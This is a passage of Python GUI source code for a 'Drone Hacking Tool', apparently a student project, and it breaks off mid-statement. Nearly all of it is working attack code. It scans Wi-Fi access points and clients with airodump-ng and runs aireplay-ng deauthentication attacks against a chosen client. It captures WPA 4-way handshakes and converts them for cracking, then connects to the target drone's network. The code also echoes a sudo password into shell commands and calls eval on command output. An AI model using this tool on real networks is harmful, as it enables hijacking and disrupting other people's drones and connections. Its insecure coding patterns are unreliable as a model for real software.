            if self.check_log_file.is_file(): #Check "hack_drone_log.csv" is really exist
                target_BSSID_log = [""]
                channel_log = [""]
                privacy_log = [""]
                password_log = [""]
                manufacturer_log = [""]
                client_BSSID_log = [""]
                selected_ap_timestamp_log = [selected_ap_timestamp]
                states_log = ["Error: Target Access Point is not selected"]
                dataframe = pd.DataFrame({"target_BSSID":target_BSSID_log, "channel":channel_log, "privacy":privacy_log, "password":password_log, "manufacturer":manufacturer_log, "client_BSSID":client_BSSID_log,"timestamp":selected_ap_timestamp_log, "states":states_log})
                dataframe.to_csv(current_path + "/data/hack_drone_log.csv", index = False, sep = ",", mode = "a", header = False) #Write log data to "drone_attack_log.csv"
            messagebox.showwarning("Tips", "You must select a Access Point.")

    def destroy_ap_display_gui(self): #Kill ap_display_gui object
        find_xterm_airodump_pid = "ps ax | grep 'xterm -iconic -T accesspointinfo -hold -e airodump-ng " + selected_interface + " -w " + current_path + "/data/ap_list -o csv' | grep -v grep | grep -v sudo | awk '{print $1}'"
        get_xterm_airodump_pid = subprocess.Popen(find_xterm_airodump_pid, stdout = subprocess.PIPE, shell = True, universal_newlines = True).stdout
        xterm_airodump_pid = get_xterm_airodump_pid.read().splitlines()
        xterm_airodump_pid_convert = str(xterm_airodump_pid) #Convert to string
        xterm_airodump_pid_strip = xterm_airodump_pid_convert.strip("[]") #Remove characters "[]"
        return_xterm_airodump_pid = eval(xterm_airodump_pid_strip) #Remove characters "''"
        colse_xterm_airodump = "echo " + sudo_password + " | sudo -S kill " + return_xterm_airodump_pid
        subprocess.Popen(colse_xterm_airodump, stdout = subprocess.PIPE, shell = True) #For close the xterm airodump terminal
        time.sleep(1.0)
        self.title_label.destroy()
        self.stop_start_button.destroy()
        self.ap_display_tree.destroy()
        self.progressbar.destroy()
        self.info_label.destroy()
        self.next_button.destroy()
        self.access_point_list_refresh_states = True
        self.drone_manufacturer_list_missing_warning == True


class GetSelectedAPClientINFO(tk.Frame):

    def __init__(self, parent, controller):
        tk.Frame.__init__(self, parent)
        self.controller = controller
        self.bind("<<ShowFrame>>",self.thread_control)

    def thread_control(self, event):
        threading.Thread(target = self.get_selected_ap_client_gui).start()
        threading.Thread(target = self.load_client).start()

    def get_selected_ap_client_gui(self):
        self.title_label = tk.Label(self, background = "white", text = "Select client to attack:", font = self.controller.title_font)
        self.title_label.pack(side = "top", fill = "x", pady = 10)

        try:
            self.refresh_button_icon = tk.PhotoImage(file = current_path + "/data/gui_img/refresh_icon.png")

            self.refresh_button = tk.Button(self, background = "white", text = "Refresh", font = self.controller.button_font, state = "disable", image = self.refresh_button_icon, compound = "left",
                               command = lambda: self.client_list_refresh())
            self.refresh_button.pack(side = "top", anchor = "e")
        except: #If icon not found
            self.refresh_button = tk.Button(self, background = "white", text = "Refresh", font = self.controller.button_font, state = "disable",
                               command = lambda: self.client_list_refresh())
            self.refresh_button.pack(side = "top", anchor = "e")

        self.get_selected_ap_client_tree = ttk.Treeview(self, style="font.Treeview", columns = ["1"], show = "headings")
        self.get_selected_ap_client_tree.column("1", width = 50, anchor = "center")
        self.get_selected_ap_client_tree.heading("1", text = "Client")
        self.get_selected_ap_client_tree.pack(side = "top", fill = "both", expand = True)

        self.progressbar = ttk.Progressbar(self, style = "green.Horizontal.TProgressbar", orient = "horizontal", mode = "determinate")
        self.progressbar.pack(fill = "x")

        self.info_label = tk.Label(self, background = "white", text = "Please wait.", font = self.controller.info_font)
        self.info_label.pack(side = "left")

        try:
            self.next_button_icon = tk.PhotoImage(file = current_path + "/data/gui_img/next_icon.png")
        
            self.next_button = tk.Button(self, background = "white", text = "Next", font = self.controller.button_font, image = self.next_button_icon, compound = "right",
                               command = lambda: self.manual_select())
            self.next_button.pack(side = "right", anchor = "se")
        except: #If icon not found
            self.next_button = tk.Button(self, background = "white", text = "Next", font = self.controller.button_font,
                               command = lambda: self.manual_select())
            self.next_button.pack(side = "right", anchor = "se")

    def menubar(self, tool):
        menubar = tk.Menu(tool)
        option_tool = tk.Menu(menubar, tearoff = 0)
        option_tool.add_command(label = "Home", command = lambda: self.menubar_home())
        option_tool.add_separator()  
        option_tool.add_command(label = "Exit", command = lambda: quit(), state="disable")
        menubar.add_cascade(label = "Option", menu = option_tool)
        help_tool = tk.Menu(menubar, tearoff = 0)
        help_tool.add_command(label = "Page guide", command = lambda: messagebox.showinfo("Page Guide",
                                    "To continue, please select one client for the attack.\n\nThe program will scan the client(s) on your selected Wi-Fi access point. If there have only one client find on the Wi-Fi access point, the program will select that client automatically. Otherwise, you need to select which clients you want to attack."))
        help_tool.add_command(label = "About", command = lambda: messagebox.showinfo("Drone Hacking Tool",
                                    "Code name: Barbary lion\nVersion: 1.1.2.111\n\nGroup member:\nSam KAN\nMichael YUEN\nDicky SHEK"))
        menubar.add_cascade(label = "Help", menu = help_tool)
        return menubar
    
    def menubar_home(self):
        try:
            self.progressbar.stop()
            find_xterm_airodump_pid = "ps ax | grep 'xterm -iconic -T clientinfo -hold -e airodump-ng " + selected_interface + " -c " + selected_channel + " --bssid " + selected_bssid + " -w " + current_path + "/data/client_list -o csv' | grep -v grep | grep -v sudo | awk '{print $1}'"
            get_xterm_airodump_pid = subprocess.Popen(find_xterm_airodump_pid, stdout = subprocess.PIPE, shell = True, universal_newlines = True).stdout
            xterm_airodump_pid = get_xterm_airodump_pid.read().splitlines()
            xterm_airodump_pid_convert = str(xterm_airodump_pid) #Convert to string
            xterm_airodump_pid_strip = xterm_airodump_pid_convert.strip("[]") #Remove characters "[]"
            return_xterm_airodump_pid = eval(xterm_airodump_pid_strip) #Remove characters "''"
            colse_xterm_airodump = "echo " + sudo_password + " | sudo -S kill " + return_xterm_airodump_pid
            subprocess.Popen(colse_xterm_airodump, stdout = subprocess.PIPE, shell = True) # For close the xterm airodump terminal
            time.sleep(0.5)
            self.destroy_get_selected_ap_client_gui()
            self.controller.show_frame("StartPage")
        except:
            pass

    def load_client(self):
        time.sleep(2.0)
        self.check_dump_file = Path(current_path + "/data/client_list-01.csv")
        if self.check_dump_file.is_file(): #Check "client_list-01.csv" is really exist
            subprocess.Popen("echo " + sudo_password + " | sudo -S rm " + current_path + "/data/client_list-01.csv", stdout = subprocess.PIPE, shell = True)
        client_info = "echo " + sudo_password + " | sudo -S xterm -iconic -T 'clientinfo' -hold -e 'airodump-ng " + selected_interface + " -c " + selected_channel + " --bssid " + selected_bssid + " -w " + current_path + "/data/client_list -o csv'"
        get_client_info_states = subprocess.Popen(client_info, stdout = subprocess.PIPE, shell = True)
        client_info_states = get_client_info_states.poll()
        while client_info_states == None:
            time.sleep(1.0)
            self.wait_for_csv_file()
            break
    
    def wait_for_csv_file(self):
        self.progressbar.start(50)
        self.info_label.config(text = "Collecting client(s) data.")
        time.sleep(5.0)
        self.progressbar.stop()
        self.refresh_button.config(state = "normal")
        threading.Thread(target = self.client_list_update).start()

    def client_list_update(self):
        try:
            read_client_list_cap = pd.read_csv(current_path + "/data/client_list-01.csv", skiprows = 3, usecols = [0])
            read_client_list_cap_df = pd.DataFrame(read_client_list_cap)
            count_row = len(read_client_list_cap_df) #Count how many row on the CSV file
            read_client_list_cap_df_drop_nan = read_client_list_cap_df.dropna() #Drop values "NaN" in the CSV file
            client_list = read_client_list_cap_df_drop_nan.values.tolist()
            #print(client_list)
            for display_ap_client_list in client_list: #Print AP's information
                self.get_selected_ap_client_tree.insert("", "end", values = display_ap_client_list)
            self.info_label.config(text = "Done.")
            if count_row == 1: #If only one client found
                self.auto_select()
            elif count_row == 0: #If no client found
                self.info_label.config(text = "Done, no client found.")
                selected_client_timestamp = time.strftime("%Y/%m/%d-%H:%M:%S") #Create a timestamp
                self.check_log_file = Path(current_path + "/data/hack_drone_log.csv")
                if self.check_log_file.is_file(): #Check "hack_drone_log.csv" is really exist
                    target_BSSID_log = [selected_bssid]
                    channel_log = [selected_channel]
                    privacy_log = [selected_privacy]
                    password_log = [""]
                    manufacturer_log = [matched_manufacturer]
                    client_BSSID_log = [""]
                    selected_ap_timestamp_log = [selected_client_timestamp]
                    states_log = ["Error: No client found in user selected Access Point"]
                    dataframe = pd.DataFrame({"target_BSSID":target_BSSID_log, "channel":channel_log, "privacy":privacy_log, "password":password_log, "manufacturer":manufacturer_log, "client_BSSID":client_BSSID_log,"timestamp":selected_ap_timestamp_log, "states":states_log})
                    dataframe.to_csv(current_path + "/data/hack_drone_log.csv", index = False, sep = ",", mode = "a", header = False) #Write log data to "drone_attack_log.csv"
                if messagebox.askretrycancel("Error", "No client found in your selected Access Point."):
                    find_xterm_airodump_pid = "ps ax | grep 'xterm -iconic -T clientinfo -hold -e airodump-ng " + selected_interface + " -c " + selected_channel + " --bssid " + selected_bssid + " -w " + current_path + "/data/client_list -o csv' | grep -v grep | grep -v sudo | awk '{print $1}'"
                    get_xterm_airodump_pid = subprocess.Popen(find_xterm_airodump_pid, stdout = subprocess.PIPE, shell = True, universal_newlines = True).stdout
                    xterm_airodump_pid = get_xterm_airodump_pid.read().splitlines()
                    xterm_airodump_pid_convert = str(xterm_airodump_pid) #Convert to string
                    xterm_airodump_pid_strip = xterm_airodump_pid_convert.strip("[]") #Remove characters "[]"
                    return_xterm_airodump_pid = eval(xterm_airodump_pid_strip) #Remove characters "''"
                    colse_xterm_airodump = "echo " + sudo_password + " | sudo -S kill " + return_xterm_airodump_pid
                    subprocess.Popen(colse_xterm_airodump, stdout = subprocess.PIPE, shell = True) # For close the xterm airodump terminal
                    self.info_label.config(text = "Please wait.")
                    threading.Thread(target = self.load_client).start()
        except:
            selected_client_timestamp = time.strftime("%Y/%m/%d-%H:%M:%S") #Create a timestamp
            self.check_log_file = Path(current_path + "/data/hack_drone_log.csv")
            if self.check_log_file.is_file(): #Check "hack_drone_log.csv" is really exist
                target_BSSID_log = [selected_bssid]
                channel_log = [selected_channel]
                privacy_log = [selected_privacy]
                password_log = [""]
                manufacturer_log = [matched_manufacturer]
                client_BSSID_log = [""]
                selected_ap_timestamp_log = [selected_client_timestamp]
                states_log = ["Error: No client found in user selected Access Point"]
                dataframe = pd.DataFrame({"target_BSSID":target_BSSID_log, "channel":channel_log, "privacy":privacy_log, "password":password_log, "manufacturer":manufacturer_log, "client_BSSID":client_BSSID_log,"timestamp":selected_ap_timestamp_log, "states":states_log})
                dataframe.to_csv(current_path + "/data/hack_drone_log.csv", index = False, sep = ",", mode = "a", header = False) #Write log data to "drone_attack_log.csv"
            if messagebox.askretrycancel("Error", "No client found in your selected Access Point."):
                find_xterm_airodump_pid = "ps ax | grep 'xterm -iconic -T clientinfo -hold -e airodump-ng " + selected_interface + " -c " + selected_channel + " --bssid " + selected_bssid + " -w " + current_path + "/data/client_list -o csv' | grep -v grep | grep -v sudo | awk '{print $1}'"
                get_xterm_airodump_pid = subprocess.Popen(find_xterm_airodump_pid, stdout = subprocess.PIPE, shell = True, universal_newlines = True).stdout
                xterm_airodump_pid = get_xterm_airodump_pid.read().splitlines()
                xterm_airodump_pid_convert = str(xterm_airodump_pid) #Convert to string
                xterm_airodump_pid_strip = xterm_airodump_pid_convert.strip("[]") #Remove characters "[]"
                return_xterm_airodump_pid = eval(xterm_airodump_pid_strip) #Remove characters "''"
                colse_xterm_airodump = "echo " + sudo_password + " | sudo -S kill " + return_xterm_airodump_pid
                subprocess.Popen(colse_xterm_airodump, stdout = subprocess.PIPE, shell = True) # For close the xterm airodump terminal
                self.info_label.config(text = "Please wait.")
                threading.Thread(target = self.load_client).start()

    def client_list_refresh(self):
        for get_selected_ap_client_item in self.get_selected_ap_client_tree.get_children(): #Clean all data in TreeView
                self.get_selected_ap_client_tree.delete(get_selected_ap_client_item)
        self.client_list_update()
    
    def auto_select(self): #Select client by program
        get_selected_ap_client_tree_info = self.get_selected_ap_client_tree.get_children()
        self.get_selected_ap_client_tree.selection_set(get_selected_ap_client_tree_info) #Select client by program
        for get_selected_ap_client_item in self.get_selected_ap_client_tree.selection(): #Get user selection
            selected_item = self.get_selected_ap_client_tree.item(get_selected_ap_client_item, "values")
        selected_item_convert = str(selected_item) #Convert to string
        selected_item_convert_strip = selected_item_convert.strip("[(,)]") #Remove characters "[(,)]"
        self.selected_item = eval(selected_item_convert_strip) #Remove characters "''"
        message_user_select = ("Automatically select " + self.selected_item + ", confirm?")
        if messagebox.askokcancel("Selected Client", message_user_select):
            self.check_selection()

    def manual_select(self): #Select client by user    
        for get_selected_ap_client_item in self.get_selected_ap_client_tree.selection(): #Get user selection
            selected_item = self.get_selected_ap_client_tree.item(get_selected_ap_client_item, "values")
            selected_item_convert = str(selected_item) #Convert to string
            selected_item_convert_strip = selected_item_convert.strip("[(,)]") #Remove characters "[(,)]"
            self.selected_item = eval(selected_item_convert_strip) #Remove characters "''"
            message_user_select = (self.selected_item + " selected.")
            if messagebox.askokcancel("Selected Client", message_user_select):
                self.check_selection()
        else:
            messagebox.showwarning("Tips", "You must select a client.")

    def check_selection(self):
        global selected_ap_client
        selected_ap_client = self.selected_item
        #print (selected_ap_client)
        selected_client_timestamp = time.strftime("%Y/%m/%d-%H:%M:%S") #Create a timestamp
        self.check_log_file = Path(current_path + "/data/hack_drone_log.csv")
        if self.check_log_file.is_file(): #Check "hack_drone_log.csv" is really exist
            target_BSSID_log = [selected_bssid]
            channel_log = [selected_channel]
            privacy_log = [selected_privacy]
            password_log = [""]
            manufacturer_log = [matched_manufacturer]
            client_BSSID_log = [selected_ap_client]
            selected_ap_timestamp_log = [selected_client_timestamp]
            states_log = ["Client BSSID selected"]
            dataframe = pd.DataFrame({"target_BSSID":target_BSSID_log, "channel":channel_log, "privacy":privacy_log, "password":password_log, "manufacturer":manufacturer_log, "client_BSSID":client_BSSID_log,"timestamp":selected_ap_timestamp_log, "states":states_log})
            dataframe.to_csv(current_path + "/data/hack_drone_log.csv", index = False, sep = ",", mode = "a", header = False) #Write log data to "drone_attack_log.csv"
        find_xterm_airodump_pid = "ps ax | grep 'xterm -iconic -T clientinfo -hold -e airodump-ng " + selected_interface + " -c " + selected_channel + " --bssid " + selected_bssid + " -w " + current_path + "/data/client_list -o csv' | grep -v grep | grep -v sudo | awk '{print $1}'"
        get_xterm_airodump_pid = subprocess.Popen(find_xterm_airodump_pid, stdout = subprocess.PIPE, shell = True, universal_newlines = True).stdout
        xterm_airodump_pid = get_xterm_airodump_pid.read().splitlines()
        xterm_airodump_pid_convert = str(xterm_airodump_pid) #Convert to string
        xterm_airodump_pid_strip = xterm_airodump_pid_convert.strip("[]") #Remove characters "[]"
        return_xterm_airodump_pid = eval(xterm_airodump_pid_strip) #Remove characters "''"
        colse_xterm_airodump = "echo " + sudo_password + " | sudo -S kill " + return_xterm_airodump_pid
        subprocess.Popen(colse_xterm_airodump, stdout = subprocess.PIPE, shell = True) # For close the xterm airodump terminal
        self.destroy_get_selected_ap_client_gui()
        self.controller.show_frame("WifiAttack")

    def destroy_get_selected_ap_client_gui(self): #Kill get_selected_ap_client_gui object
        self.title_label.destroy()
        self.refresh_button.destroy()
        self.get_selected_ap_client_tree.destroy()
        self.progressbar.destroy()
        self.info_label.destroy()
        self.next_button.destroy()


class WifiAttack(tk.Frame):

    def __init__(self, parent, controller):
        tk.Frame.__init__(self, parent)
        self.controller = controller
        self.bind("<<ShowFrame>>", self.thread_control)
        #self.check_askstring_open = False

    def thread_control(self, event):
        threading.Thread(target = self.wifi_attack_gui).start()
        threading.Thread(target = self.load_attack).start()
        app.after(2000, self.check_askstring)

    def wifi_attack_gui(self):
        self.title_label = tk.Label(self, background = "white", text = "Attack target:", font = self.controller.title_font)
        self.title_label.pack(side = "top", fill = "x", pady = 10)

        self.step1_label = tk.Label(self, background = "white", text = "", font = self.controller.label_font)
        self.step1_label.pack(side = "top", pady = 10)

        self.step2_label = tk.Label(self, background = "white", text = "", font = self.controller.label_font)
        self.step2_label.pack(side = "top", pady = 10)

        self.step3_label = tk.Label(self, background = "white", text = "", font = self.controller.label_font)
        self.step3_label.pack(side = "top", pady = 10)

        self.step4_label = tk.Label(self, background = "white", text = "", font = self.controller.label_font)
        self.step4_label.pack(side = "top", pady = 10)

        self.image_label = tk.Label(self, background = "white", text = "", font = self.controller.label_font)
        self.image_label.pack(pady = 40)

        self.info_label = tk.Label(self, background = "white", text = "Loading.", font = self.controller.info_font)
        self.info_label.pack(side = "bottom", anchor = "sw", pady = 5)

        self.progressbar = ttk.Progressbar(self, style="green.Horizontal.TProgressbar", orient = "horizontal", mode = "indeterminate")
        self.progressbar.pack(side = "bottom", fill = "x")

    def menubar(self, tool):
        menubar = tk.Menu(tool)
        option_tool = tk.Menu(menubar, tearoff = 0)
        option_tool.add_command(label = "Home", command = lambda: quit(), state="disable")
        option_tool.add_separator()  
        option_tool.add_command(label = "Exit", command = lambda: quit(), state="disable")
        menubar.add_cascade(label = "Option", menu = option_tool)
        help_tool = tk.Menu(menubar, tearoff = 0)
        help_tool.add_command(label = "Page guide", command = lambda: messagebox.showinfo("Page Guide",
                                    "Attack drone based on different cases.\n\nPlease follow the instruction from the program."))
        help_tool.add_command(label = "About", command = lambda: messagebox.showinfo("Drone Hacking Tool",
                                    "Code name: Barbary lion\nVersion: 1.1.2.111\n\nGroup member:\nSam KAN\nMichael YUEN\nDicky SHEK"))
        menubar.add_cascade(label = "Help", menu = help_tool)
        return menubar

    def load_attack(self):
        if selected_privacy == "OPN": #For no password access point
            time.sleep(0.3)
            try:
                self.label_loading_icon = tk.PhotoImage(file = current_path + "/data/gui_img/loading_icon.png")
                self.label_finish_icon = tk.PhotoImage(file = current_path + "/data/gui_img/finish_icon.png")
                self.label_fail_icon = tk.PhotoImage(file = current_path + "/data/gui_img/fail_icon.png")
                self.image_label_image = tk.PhotoImage(file = current_path + "/data/gui_img/drone_hacking.png")
                self.step1_label.config(text = "Start Wi-Fi deauthentication attack            ", image = self.label_loading_icon, compound = "right")
                self.step2_label.config(text = "Switch Wi-Fi adapter to manage mode      ", image = self.label_loading_icon, compound = "right")
                self.step3_label.config(text = "Connect your selected target                      ", image = self.label_loading_icon, compound = "right")
                self.image_label.config(image = self.image_label_image)
            except: #If icon not found
                self.step1_label.config(text = "Start Wi-Fi deauthentication attack            ☐")
                self.step2_label.config(text = "Switch Wi-Fi adapter to manage mode      ☐")
                self.step3_label.config(text = "Connect your selected target                      ☐")
            threading.Thread(target = self.deauthenticat_wifi_network).start()
        else:
            time.sleep(0.3)
            try:
                self.label_loading_icon = tk.PhotoImage(file = current_path + "/data/gui_img/loading_icon.png")
                self.label_finish_icon = tk.PhotoImage(file = current_path + "/data/gui_img/finish_icon.png")
                self.label_fail_icon = tk.PhotoImage(file = current_path + "/data/gui_img/fail_icon.png")
                self.image_label_image = tk.PhotoImage(file = current_path + "/data/gui_img/drone_hacking.png")
                self.step1_label.config(text = "Wait for user select                                      ", image = self.label_loading_icon, compound = "right")
                self.step2_label.config(text = "Start Wi-Fi deauthentication attack            ", image = self.label_loading_icon, compound = "right")
                self.step3_label.config(text = "Switch Wi-Fi adapter to manage mode      ", image = self.label_loading_icon, compound = "right")
                self.step4_label.config(text = "Connect your selected target                      ", image = self.label_loading_icon, compound = "right")
                self.image_label.config(image = self.image_label_image)
            except: #If icon not found
                self.step1_label.config(text = "Wait for user select                                      ☐")
                self.step2_label.config(text = "Start Wi-Fi deauthentication attack            ☐")
                self.step3_label.config(text = "Switch Wi-Fi adapter to manage mode      ☐")
                self.step4_label.config(text = "Connect your selected target                      ☐")
            threading.Thread(target = self.match_wifi_password).start()
        
    def deauthenticat_wifi_network(self): #Deauthentication attack for access point
        try:
            deauth_info = "echo " + sudo_password + " | sudo -S aireplay-ng -0 15 -a " + selected_bssid + " -c " + selected_ap_client + " " + selected_interface
            #print(deauth_info)
            self.info_label.config(text = "Starting Wi-Fi deauthentication attack.")
            subprocess.Popen(deauth_info, stdout = subprocess.PIPE, shell = True, universal_newlines = True)
            self.progressbar.start()
            time.sleep(10.0)
            if selected_privacy == "OPN":
                try:
                    self.step1_label.config(text = "Start Wi-Fi deauthentication attack            ", image = self.label_finish_icon, compound = "right")
                except: #If icon not found
                    self.step1_label.config(text = "Start Wi-Fi deauthentication attack            ☑")
            else:
                try:
                    self.step2_label.config(text = "Start Wi-Fi deauthentication attack            ", image = self.label_finish_icon, compound = "right")
                except: #If icon not found
                    self.step2_label.config(text = "Start Wi-Fi deauthentication attack            ☑")
            self.restart_network()
        except:
            try:
                self.step1_label.config(text = "Start Wi-Fi deauthentication attack            ", image = self.label_fail_icon, compound = "right")
            except: #If icon not found
                self.step1_label.config(text = "Start Wi-Fi deauthentication attack            ☒")
            if messagebox.askretrycancel("Error", "An error occurred while processing your request."):
                self.deauthenticat_wifi_network()

    def match_wifi_password(self):
        global cracked_password_output, cracked_passwordstr_timestamp
        time.sleep(1.0)
        try:
            read_cracked_password_list_cap = pd.read_csv(current_path + "/data/cracked_password_list.csv") #Read csv "cracked_password_list.csv" file
            read_cracked_password_list_df = pd.DataFrame(read_cracked_password_list_cap)
            read_cracked_password_list_filter = read_cracked_password_list_df[read_cracked_password_list_df.cracked_BSSID == selected_bssid] #Drop abnormal data
            read_cracked_password_list_timestamp_sort = read_cracked_password_list_filter.sort_values(by = "timestamp" , ascending = False)
            read_cracked_password_list_latest = read_cracked_password_list_timestamp_sort.iloc[0] #Collect the latest row
            read_cracked_password_list_password = read_cracked_password_list_latest["password"]
            read_cracked_password_list_timestamp = read_cracked_password_list_latest["timestamp"]
            cracked_password_output = str(read_cracked_password_list_password)
            cracked_passwordstr_timestamp = (read_cracked_password_list_timestamp)
            #print(cracked_password_output)
            self.info_label.config(text = "Waiting for user select.")
            self.progressbar.start()
        except IndexError:
            self.info_label.config(text = "Waiting for user select.")
            self.progressbar.start()
            cracked_password_output = ""
        except:
            self.info_label.config(text = "Waiting for user select.")
            self.progressbar.start()
            pass

    def check_askstring(self): #Ask for user confirm
        global user_provide_password
        try:
            if selected_privacy != "OPN":
                if cracked_password_output != "":
                    message_user_provide_password = "A password " + cracked_password_output + " on " + cracked_passwordstr_timestamp + " matched with your selected BSSID.\nThe password is already filled in by program.\nIf you accept this password, please press 'OK'.\nOtherwise, press 'Cancel' to collect 4-way handshake.\nPassword:"
                    user_provide_password = simpledialog.askstring("Matched Password Found", message_user_provide_password, initialvalue = cracked_password_output, show = "*")
                    if user_provide_password == None:
                        threading.Thread(target = self.encrypted_wifi_network).start()
                    elif user_provide_password == "":
                        if messagebox.showerror("Error", "This connection is encrypted. You must type in password."):
                            self.check_askstring()
                    else:
                        if len(user_provide_password) < 8: #Check Wi-Fi password characters length
                            if messagebox.askokcancel("Warning", "Wi-Fi password should be longer than 7 characters, are you sure?"):
                                try:
                                    self.step1_label.config(text = "Wait for user select                                      ", image = self.label_finish_icon, compound = "right")
                                except: #If icon not found
                                    self.step1_label.config(text = "Wait for user select                                      ☑")
                                threading.Thread(target = self.deauthenticat_wifi_network).start()
                            else:
                                self.check_askstring()
                        else:
                            try:
                                self.step1_label.config(text = "Wait for user select                                      ", image = self.label_finish_icon, compound = "right")
                            except: #If icon not found
                                self.step1_label.config(text = "Wait for user select                                      ☑")
                            threading.Thread(target = self.deauthenticat_wifi_network).start()
                elif cracked_password_output == "":
                    user_provide_password = simpledialog.askstring("Password Required", "This connection is encrypted.\nIf you know the connection password, please type in password.\nOtherwise, press 'Cancel' to collect 4-way handshake.\nPassword:", show = "*")
                    if user_provide_password == None:
                        threading.Thread(target = self.encrypted_wifi_network).start()
                    elif user_provide_password == "":
                        if messagebox.showerror("Error", "This connection is encrypted. You must type in password."):
                            self.check_askstring()
                    else:
                        if len(user_provide_password) < 8: #Check Wi-Fi password characters length
                            if messagebox.askokcancel("Warning", "Wi-Fi password should be longer than 7 characters, are you sure?"):
                                try:
                                    self.step1_label.config(text = "Wait for user select                                      ", image = self.label_finish_icon, compound = "right")
                                except: #If icon not found
                                    self.step1_label.config(text = "Wait for user select                                      ☑")
                                threading.Thread(target = self.deauthenticat_wifi_network).start()
                            else:
                                self.check_askstring()
                        else:
                            try:
                                self.step1_label.config(text = "Wait for user select                                      ", image = self.label_finish_icon, compound = "right")
                            except: #If icon not found
                                self.step1_label.config(text = "Wait for user select                                      ☑")
                            threading.Thread(target = self.deauthenticat_wifi_network).start()
        except:
            if messagebox.showwarning("Error", "File 'cracked_password_list.csv' not found."):
                user_provide_password = simpledialog.askstring("Password Required", "This connection is encrypted.\nIf you know the connection password, please type in password.\nOtherwise, press 'Cancel' to collect 4-way handshake.\nPassword:", show = "*")
                if user_provide_password == None:
                    threading.Thread(target = self.encrypted_wifi_network).start()
                elif user_provide_password == "":
                    if messagebox.showerror("Error", "This connection is encrypted. You must type in password."):
                        self.check_askstring()
                else:
                    if len(user_provide_password) < 8: #Check Wi-Fi password characters length
                        if messagebox.askokcancel("Warning", "Wi-Fi password should be longer than 7 characters, are you sure?"):
                            try:
                                self.step1_label.config(text = "Wait for user select                                      ", image = self.label_finish_icon, compound = "right")
                            except: #If icon not found
                                self.step1_label.config(text = "Wait for user select                                      ☑")
                            threading.Thread(target = self.deauthenticat_wifi_network).start()
                        else:
                            self.check_askstring()
                    else:
                        try:
                            self.step1_label.config(text = "Wait for user select                                      ", image = self.label_finish_icon, compound = "right")
                        except: #If icon not found
                            self.step1_label.config(text = "Wait for user select                                      ☑")
                        threading.Thread(target = self.deauthenticat_wifi_network).start()

    def encrypted_wifi_network(self):
        global four_way_handshake_file_timestamp, four_way_handshake_convert_file
        try:
            self.step1_label.config(text = "Wait for user select                                      ", image = self.label_finish_icon, compound = "right")
            self.step2_label.config(text = "Collect 4-way handshake                              ", image = self.label_loading_icon, compound = "right")
            self.step3_label.config(text = "", image = "", compound = "right")
            self.step4_label.config(text = "", image = "", compound = "right")
        except: #If icon not found
            self.step1_label.config(text = "Wait for user select                                      ☑")
            self.step2_label.config(text = "Collect 4-way handshake                              ☐")
            self.step3_label.config(text = "")
            self.step4_label.config(text = "")
        self.info_label.config(text = "Collecting 4-way handshake.")
        four_way_handshake_file_timestamp = time.strftime("%Y%m%d-%H%M%S") #Create a timestamp for 4-way handshake file
        deauth_info = "echo " + sudo_password + " | sudo -S xterm -iconic -T 'deauthinfo' -e 'aireplay-ng -0 35 -a " + selected_bssid + " -c " + selected_ap_client + " " + selected_interface + "'"
        four_way_handshake_info = "echo " + sudo_password + " | sudo -S xterm -iconic -T 'handshakeinfo' -hold -e 'airodump-ng -c " + selected_channel + " --bssid " + selected_bssid + " -w " + current_path + "/handshake/" + selected_bssid + "_" + four_way_handshake_file_timestamp + " " + selected_interface + "'"
        #print(deauth_info)
        #print(four_way_handshake_info)
        subprocess.Popen(deauth_info, stdout = subprocess.PIPE, shell = True)
        subprocess.Popen(four_way_handshake_info, stdout = subprocess.PIPE, shell = True)
        time.sleep(22.0)
        find_xterm_airodump_pid = "ps ax | grep 'xterm -iconic -T handshakeinfo -hold -e airodump-ng -c " + selected_channel + " --bssid " + selected_bssid + " -w " + current_path + "/handshake/" + selected_bssid + "_" + four_way_handshake_file_timestamp + " " + selected_interface + "'" + " | grep -v grep | grep -v sudo | awk '{print $1}'"
        get_xterm_airodump_pid = subprocess.Popen(find_xterm_airodump_pid, stdout = subprocess.PIPE, shell = True, universal_newlines = True).stdout
        xterm_airodump_pid = get_xterm_airodump_pid.read().splitlines()
        xterm_airodump_pid_convert = str(xterm_airodump_pid) #Convert to string
        xterm_airodump_pid_strip = xterm_airodump_pid_convert.strip("[]") #Remove characters "[]"
        return_xterm_airodump_pid = eval(xterm_airodump_pid_strip) #Remove characters "''"
        colse_xterm_airodump = "echo " + sudo_password + " | sudo -S kill " + return_xterm_airodump_pid
        close_xterm_airodump_terminal = subprocess.Popen(colse_xterm_airodump, stdout = subprocess.PIPE, shell = True) #For close the xterm airodump terminal
        close_xterm_airodump_terminal.wait()
        check_four_way_handshake = "echo " + sudo_password + " | sudo aircrack-ng " + current_path + "/handshake/" + selected_bssid + "_" + four_way_handshake_file_timestamp + "-01.cap -j " + current_path + "/handshake/hashcat_convert_file/" + selected_bssid + "_" + four_way_handshake_file_timestamp + " 2>&1 | grep Successfully | awk '{print $1}'"
        #print(check_four_way_handshake)
        get_four_way_handshake_states = subprocess.Popen(check_four_way_handshake, stdout = subprocess.PIPE, stderr = subprocess.STDOUT, shell = True, universal_newlines = True).stdout
        four_way_handshake_states = get_four_way_handshake_states.read().splitlines()
        if len(four_way_handshake_states) != 0:
            four_way_handshake_states_convert = str(four_way_handshake_states) #Convert to string
            four_way_handshake_states_strip = four_way_handshake_states_convert.strip("[]") #Remove characters "[]"
            return_four_way_handshake_states = eval(four_way_handshake_states_strip) #Remove characters "''"
            #print(return_four_way_handshake_states)
            if return_four_way_handshake_states == "Successfully": #Get 4-way handshake successfully
                try:
                    self.step2_label.config(text = "Collect 4-way handshake                              ", image = self.label_finish_icon, compound = "right")
                except: #If icon not found
                    self.step2_label.config(text = "Collect 4-way handshake                              ☑")
                success_timestamp = time.strftime("%Y/%m/%d-%H:%M:%S") #Create a timestamp
                self.check_log_file = Path(current_path + "/data/hack_drone_log.csv")
                if self.check_log_file.is_file(): #Check "hack_drone_log.csv" is really exist
                    target_BSSID_log = [selected_bssid]
                    channel_log = [selected_channel]
                    privacy_log = [selected_privacy]
                    password_log = [""]
                    manufacturer_log = [matched_manufacturer]
                    client_BSSID_log = [selected_ap_client]
                    connect_timestamp_log = [success_timestamp]
                    states_log = ["4 way handshake file save at: " + current_path + "/handshake, the name is:" + selected_bssid + "_" + four_way_handshake_file_timestamp + "-01"]
                    dataframe = pd.DataFrame({"target_BSSID":target_BSSID_log, "channel":channel_log, "privacy":privacy_log, "password":password_log, "manufacturer":manufacturer_log, "client_BSSID":client_BSSID_log, "timestamp":connect_timestamp_log, "states":states_log})
